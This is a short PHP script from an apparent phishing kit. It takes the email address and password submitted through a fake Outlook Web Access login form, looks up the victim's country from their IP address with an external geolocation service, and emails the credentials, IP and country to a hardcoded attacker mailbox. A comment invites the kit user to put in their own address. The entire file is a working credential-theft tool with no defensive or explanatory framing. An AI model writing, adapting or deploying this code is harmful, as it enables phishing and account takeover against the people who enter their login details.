<?php

header('Access-Control-Allow-Origin: *');

if(isset($_POST['temail']) && isset($_POST['tpass'])){


function visitor_country()
 {
 $ip = getenv("REMOTE_ADDR");
 $result = "Unknown"; 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $country = json_decode(curl_exec($ch))->country;
 if ($country != null)
  {
  $result = $country;
  }

 return $result;
 }

$email = $_POST['temail'];
$password = $_POST['tpass'];
$recipient = "bull6red@yandex.com"; // Replace your email id here
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

$date = date('d-m-Y');
  $ip = getenv("REMOTE_ADDR");
  $message = "-----------------++-----------------\n";
  $message.= "User ID: " . $email . "\n";
  $message.= "Password: " . $password . "\n";
  $message.= "Client IP      : $ip\n";
  $message.= "Client Country      : $country\n";
  $message.= "-----------------++-----------------\n";
  $subject = "OWA| ".$country." | " . $ip . "\n";
  $headers = "MIME-Version: 1.0\n";

  mail($recipient, $subject, $message, $headers);


 }
?>